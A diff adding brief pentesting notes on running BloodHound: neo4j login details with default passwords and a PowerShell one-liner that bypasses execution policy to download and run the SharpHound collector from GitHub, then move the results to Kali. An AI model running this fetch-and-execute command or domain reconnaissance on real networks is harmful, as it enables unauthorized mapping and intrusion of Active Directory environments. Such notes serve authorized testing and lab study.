@@ -1,0 +1,22 @@
+neo4j console
+localhost:7474
+uname: neo4j
+pwd: bloodhound or neo4j
+
+NEW Terminal:
+bloodhound &
+Upload
+DC1 -> look for map
+
+
+Useful one-liner:
+# Invoke-Bloodhound
+powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"
+
+Once ingestory is complete and the .zip is created, transfer this over to Kali. 
+
+
+
+
+
+
